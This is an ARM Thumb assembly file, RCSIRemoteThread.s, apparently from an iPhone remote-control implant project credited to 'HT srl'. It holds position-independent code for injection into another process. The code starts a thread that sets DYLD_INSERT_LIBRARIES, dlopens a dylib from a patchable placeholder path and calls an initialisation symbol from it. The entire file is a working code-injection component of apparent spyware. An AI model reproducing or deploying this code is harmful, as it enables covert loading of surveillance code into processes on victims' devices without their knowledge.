//
//  RCSIRemoteThread.s
//  RCSIphone
//
//  Created by kiodo on 26/04/12.
//  Copyright 2012 HT srl. All rights reserved.
//

.data
.thumb
.globl _rThread, _rThread_end, _dylib_path, _insert_lib, _checkInitT

_rThread:

// pthread_t pth;
// pthread_set_self(pthd);
mov   r0, sp
sub   r0, #255
sub   r0, #255
sub   r0, #255
sub   r0, #255
str   r0, [r0, #48]
ldr   r4, pthread_set_self
blx   r4

.align 2

// cthread_set_self(pthd);
ldr   r4, cthread_set_self
blx   r4

mov   r1, #0
push  {r1}
mov   r0, sp
adr   r2, entry
add   r2, #1
ldr   r4, pthread_create
blx   r4

ldr r4, mach_thread_self
blx r4
ldr r4, thread_terminate
bx r4
.align 2

entry:
// int len = strlen(dylib_path);
adr r0, _dylib_path
ldr r4, strlen
blx r4

// setenv("DYLD_INSERT_LIBRARIES", dylib_path, len);
mov r2, r0
adr r1, _dylib_path
adr r0, _insert_lib
ldr r4, setenv
blx r4

// dlopen(dylib_path);
mov r0, #1
adr r0, _dylib_path
mov r1, #1
ldr r2, dlopen
blx r2

cmp r0, #0
beq end_thread

// dlsym(handle, _checkInitT);
adr r1, _checkInitT
ldr r4, dlsym
blx r4

cmp r0, #0
beq end_thread

// checkInit();
mov r4, r0
adr r0, _dylib_path
blx r4

end_thread:

ldr r4, mach_thread_self
blx r4
ldr r4, thread_terminate
blx r4

.align 2

pthread_set_self:  .long ___pthread_set_self
pthread_create:    .long _pthread_create
pthread_exit:      .long _pthread_exit
mach_thread_self:  .long _mach_thread_self
cthread_set_self:  .long _cthread_set_self
thread_terminate:  .long _thread_terminate

setenv:            .long _setenv
strlen:            .long _strlen
dlopen:            .long _dlopen
dlsym:             .long _dlsym

_dylib_path:       .ascii  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
_insert_lib:       .ascii  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
_checkInitT:       .ascii  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
_rThread_end: